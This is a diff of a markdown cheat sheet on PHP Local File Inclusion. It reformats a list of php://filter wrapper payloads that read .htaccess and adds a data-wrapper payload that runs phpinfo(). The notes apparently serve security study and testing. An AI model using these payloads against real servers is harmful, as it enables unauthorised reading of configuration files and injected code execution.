@@ -1,3 +1,5 @@
+# Local File Inclusion (LFI)
+
 ## PHP Vulnerable functions:
 
 ### Include_once()
@@ -44,19 +46,29 @@
 
 ### PHP WRAPPERS
 
-#### 1) php://filter/convert.base64-encode/resource=.htaccess
+#### 1) 
 
-#### 2) php://filter/string.rot13/resource=.htaccess
+    php://filter/convert.base64-encode/resource=.htaccess
 
-#### 3) php://filter/string.toupper/resource=.htaccess
+#### 2) 
 
-#### 4) php://filter/string.tolower/resource=.htaccess
+    php://filter/string.rot13/resource=.htaccess
 
-#### 5) php://filter/string.strip_tags/resource=.htaccess
+#### 3) 
+
+    php://filter/string.toupper/resource=.htaccess
+
+#### 4) 
+
+    php://filter/string.tolower/resource=.htaccess
+
+#### 5) 
+
+    php://filter/string.strip_tags/resource=.htaccess
 
 ### DATA WRAPPER 
 
-#### data:text/plain,<?php phpinfo(); ?<
+    data:text/plain,<?php phpinfo(); ?>
 
 ## Important files to look for:
 
